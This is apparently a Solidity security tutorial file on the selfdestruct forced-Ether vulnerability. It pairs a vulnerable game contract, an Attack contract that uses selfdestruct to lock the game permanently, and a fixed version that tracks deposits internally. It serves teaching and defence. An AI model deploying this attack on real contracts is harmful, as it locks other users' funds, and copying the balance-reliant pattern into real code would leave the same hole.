// Contracts can be deleted from the blockchain by calling selfdestruct.

// selfdestruct sends all remaining Ether stored in the contract to a designated address.

// Vulnerability
// A malicious contract can use selfdestruct to force sending Ether to any contract.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// The goal of this game is to be the 7th player to deposit 1 Ether.
// Players can deposit only 1 Ether at a time.
// Winner will be able to withdraw all Ether.

/*
1. Deploy EtherGame
2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game
   No one can become the winner.

What happened?
Attack forced the balance of EtherGame to equal 7 ether.
Now no one can deposit and the winner cannot be set.
*/

contract EtherGame {
    uint256 public constant TARGET_AMOUNT = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 ether");

        uint256 balance = address(this).balance;
        require(balance <= TARGET_AMOUNT, "Game is over");

        if (balance == TARGET_AMOUNT) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // you can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}

// Prevent Techniques
// Don't rely on `address(this).balance;`

contract PreventEtherGame {
    uint256 public constant TARGET_AMOUNT = 7 ether;
    uint256 public balance;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 ether");

        balance += msg.value;
        require(balance <= TARGET_AMOUNT, "Game is over");

        if(balance == TARGET_AMOUNT) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");
        uint256 amount = balance;
        balance = 0;
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send ether");
    }
}